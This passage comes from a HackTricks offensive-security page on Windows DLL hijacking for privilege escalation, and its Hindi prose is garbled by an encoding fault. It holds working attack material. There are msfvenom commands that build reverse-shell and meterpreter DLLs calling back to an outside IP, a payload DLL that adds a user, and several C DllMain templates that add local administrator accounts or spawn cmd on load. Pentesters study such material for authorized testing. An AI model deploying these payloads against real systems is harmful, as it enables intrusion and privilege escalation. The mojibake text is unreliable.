рдХреЗ рд▓рд┐рдП DLL рд╣рд╛рдЗрдЬреИрдХрд┐рдВрдЧ рдХреЗ рд▓рд┐рдП рд╣реИ рдЬрд┐рд╕реЗ рдЖрдк рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ (рд╕рдВрднрд╡рддрдГ рдХреЗрд╡рд▓ рдЙрд╕ рдлрд╝реЛрд▓реНрдбрд░ рдХреЗ рдкрде рдХреЛ рдмрджрд▓рдХрд░ рдЬрд╣рд╛рдВ рдЖрдкрдХреЗ рдкрд╛рд╕ рд▓реЗрдЦрди рдЕрдиреБрдорддрд┐рдпрд╛рдБ рд╣реИрдВ)ред

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЖрдк **рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдЕрдкрдиреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
рдФрд░ **PATH рдХреЗ рдЕрдВрджрд░ рд╕рднреА рдлрд╝реЛрд▓реНрдбрд░реЛрдВ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
рдЖрдк рдПрдХ рдирд┐рд╖реНрдкрд╛рджрди рдпреЛрдЧреНрдп рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЖрдпрд╛рдд рдФрд░ рдПрдХ dll рдХреЗ рдирд┐рд░реНрдпрд╛рдд рдХреЛ рднреА рдЬрд╛рдВрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```c
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:

{% content-ref url="writable-sys-path-+dll-hijacking-privesc.md" %}
[writable-sys-path-+dll-hijacking-privesc.md](writable-sys-path-+dll-hijacking-privesc.md)
{% endcontent-ref %}

### Automated tools

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)рдпрд╣ рдЬрд╛рдВрдЪреЗрдЧрд╛ рдХрд┐ рдХреНрдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рд╕рд┐рд╕реНрдЯрдо PATH рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рднреА рдлрд╝реЛрд▓реНрдбрд░ рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИред\
рдЗрд╕ рднреЗрджреНрдпрддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп рджрд┐рд▓рдЪрд╕реНрдк рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рдЙрдкрдХрд░рдг рд╣реИрдВ **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ рдФрд░ _Write-HijackDll._

### Example

рдпрджрд┐ рдЖрдк рдПрдХ exploitable рдкрд░рд┐рджреГрд╢реНрдп рдкрд╛рддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕реЗ рд╕рдлрд▓рддрд╛рдкреВрд░реНрд╡рдХ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдЪреАрдЬреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛрдЧрд╛ **рдПрдХ dll рдмрдирд╛рдирд╛ рдЬреЛ рдХрдо рд╕реЗ рдХрдо рд╕рднреА рдХрд╛рд░реНрдпреЛрдВ рдХреЛ рдирд┐рд░реНрдпрд╛рдд рдХрд░рддрд╛ рд╣реИ рдЬреЛ executable рдЗрд╕рд╕реЗ рдЖрдпрд╛рдд рдХрд░реЗрдЧрд╛**ред рдХрд┐рд╕реА рднреА рддрд░рд╣, рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ Dll Hijacking рдЙрдкрдпреЛрдЧреА рд╣реИ рддрд╛рдХрд┐ [рдордзреНрдпрдо рдЗрдВрдЯреАрдЧреНрд░рд┐рдЯреА рд╕реНрддрд░ рд╕реЗ рдЙрдЪреНрдЪ **(UAC рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рддреЗ рд╣реБрдП)**](../../authentication-credentials-uac-and-efs/#uac) рдпрд╛ [**рдЙрдЪреНрдЪ рдЗрдВрдЯреАрдЧреНрд░рд┐рдЯреА рд╕реЗ SYSTEM**](../#from-high-integrity-to-system)**ред** рдЖрдк рдЗрд╕ dll hijacking рдЕрдзреНрдпрдпрди рдореЗрдВ **рдПрдХ рдорд╛рдиреНрдп dll рдХреИрд╕реЗ рдмрдирд╛рдПрдВ** рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд▓рд┐рдП dll hijacking рдкрд░ рдХреЗрдВрджреНрд░рд┐рдд рд╣реИ: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**ред**\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдЕрдЧрд▓реЗ рдЕрдиреБрднрд╛рдЧ** рдореЗрдВ рдЖрдк рдХреБрдЫ **рдмреБрдирд┐рдпрд╛рджреА dll рдХреЛрдб** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ **рдЯреЗрдореНрдкрд▓реЗрдЯ** рдХреЗ рд░реВрдк рдореЗрдВ рдпрд╛ **рдирд┐рд╖реНрдХреНрд░рд┐рдп рдХрд╛рд░реНрдпреЛрдВ рдХреЗ рд╕рд╛рде рдПрдХ dll рдмрдирд╛рдиреЗ** рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

## **Creating and compiling Dlls**

### **Dll Proxifying**

рдмреБрдирд┐рдпрд╛рджреА рд░реВрдк рд╕реЗ рдПрдХ **Dll proxy** рдПрдХ Dll рд╣реИ рдЬреЛ **рд▓реЛрдб рд╣реЛрдиреЗ рдкрд░ рдЖрдкрдХреЗ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реИ** рд▓реЗрдХрд┐рди рд╕рд╛рде рд╣реА **рдкреНрд░рджрд░реНрд╢рд┐рдд** рдФрд░ **рдХрд╛рдо** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╕рднреА рдХреЙрд▓ рдХреЛ рдЕрд╕рд▓реА рдкреБрд╕реНрддрдХрд╛рд▓рдп рдореЗрдВ рд░рд┐рд▓реЗ рдХрд░рдХреЗ**ред

рдЙрдкрдХрд░рдг [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) рдпрд╛ [**Spartacus**](https://github.com/Accenture/Spartacus) рдХреЗ рд╕рд╛рде рдЖрдк рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ **рдПрдХ executable рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрд╕ рдкреБрд╕реНрддрдХрд╛рд▓рдп рдХрд╛ рдЪрдпрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЬрд┐рд╕реЗ рдЖрдк proxify рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдФрд░ **рдПрдХ proxified dll рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдпрд╛ **Dll рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ **рдПрдХ proxified dll рдЙрддреНрдкрдиреНрди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдПрдХ рдореАрдЯрд░рдкреНрд░реЗрдЯрд░ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛рдПрдВ (x86 рдореИрдВрдиреЗ x64 рд╕рдВрд╕реНрдХрд░рдг рдирд╣реАрдВ рджреЗрдЦрд╛):**
```
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### рдЖрдкрдХрд╛ рдЦреБрдж рдХрд╛

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдорд╛рдорд▓реЛрдВ рдореЗрдВ, Dll рдЬрд┐рд╕реЗ рдЖрдк рд╕рдВрдХрд▓рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, рдХреЛ **рдХрдИ рдлрд╝рдВрдХреНрд╢рди рдирд┐рд░реНрдпрд╛рдд** рдХрд░рдиреЗ рдЪрд╛рд╣рд┐рдП рдЬреЛ рдкреАрдбрд╝рд┐рдд рдкреНрд░рдХреНрд░рд┐рдпрд╛ рджреНрд╡рд╛рд░рд╛ рд▓реЛрдб рдХрд┐рдП рдЬрд╛рдПрдВрдЧреЗ, рдпрджрд┐ рдпреЗ рдлрд╝рдВрдХреНрд╢рди рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИрдВ рддреЛ **рдмрд╛рдЗрдирд░реА рдЙрдиреНрд╣реЗрдВ рд▓реЛрдб рдирд╣реАрдВ рдХрд░ рдкрд╛рдПрдЧреА** рдФрд░ **рд╢реЛрд╖рдг рд╡рд┐рдлрд▓ рд╣реЛ рдЬрд╛рдПрдЧрд╛**ред
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
## рд╕рдВрджрд░реНрдн

* [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
* [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)

<figure><img src="../../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>

**рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдЯрд┐рдк**: **рд╕рд╛рдЗрди рдЕрдк рдХрд░реЗрдВ** **Intigriti** рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **рдмрдЧ рдмрд╛рдЙрдВрдЯреА рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдо рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░ рд╣рдорд╛рд░реЗ рд╕рд╛рде рдЬреБрдбрд╝реЗрдВ, рдФрд░ **$100,000** рддрдХ рдХреА рдмрд╛рдЙрдВрдЯреА рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдБ**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* **рд╣рдорд╛рд░реЗ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ рдпрд╛ **Twitter** ЁЯРж рдкрд░ рд╣рдореЗрдВ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ PRs рдХреЛ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдЧрд┐рдЯрд╣рдм рд░рд┐рдкреЛрдЬрд┐рдЯрд░реА рдореЗрдВ рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>
{% endhint %}
